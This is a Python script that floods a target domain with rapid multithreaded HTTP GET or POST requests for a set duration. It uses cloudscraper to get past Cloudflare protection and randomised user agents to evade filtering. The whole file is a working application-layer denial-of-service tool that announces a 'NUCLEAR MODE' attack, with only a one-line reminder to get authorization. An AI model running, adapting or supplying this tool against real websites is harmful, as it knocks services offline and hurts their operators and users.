import os
import random
import threading
import time
import cloudscraper
from fake_useragent import UserAgent

# Initialize UserAgent for random headers
ua = UserAgent()

# Cloudflare bypass with cloudscraper
scraper = cloudscraper.create_scraper()

# Super-fast GET/POST flood
def super_fast_flood(target, method="GET", threads=12, duration=60):
    def worker():
        start_time = time.time()
        while time.time() - start_time < duration:
            try:
                headers = {
                    'User-Agent': ua.random,
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Referer': 'https://www.google.com/',
                    'Connection': 'keep-alive',
                }
                if method.upper() == "GET":
                    scraper.get(f"https://{target}", headers=headers, timeout=5)
                elif method.upper() == "POST":
                    scraper.post(f"https://{target}", headers=headers, data=os.urandom(1024), timeout=5)
                print(f"[SUCCESS] {method} request sent to {target}")
            except Exception as e:
                print(f"[ERROR] {method} request failed: {e}")
            time.sleep(0.01)  # Ultra-low delay for maximum speed

    # Launch threads
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

    print(f"?? NUCLEAR MODE ACTIVATED: {threads} threads firing {method} requests at {target} for {duration} seconds!")
    time.sleep(duration)
    print("?? Attack completed.")

# Main function
def main():
    target = input("Enter target domain (e.g., example.com): ").strip()
    method = input("Enter attack method (GET/POST, default GET): ").strip().upper() or "GET"
    threads = int(input("Enter number of threads (default 12): ") or 12)
    duration = int(input("Enter attack duration in seconds (default 60): ") or 60)

    print(f"\n?? WARNING: This script will launch a high-speed stress test on {target}.")
    print("Ensure you have explicit authorization before proceeding.")
    input("Press ENTER to start...")

    super_fast_flood(target, method, threads, duration)

if __name__ == "__main__":
    main()
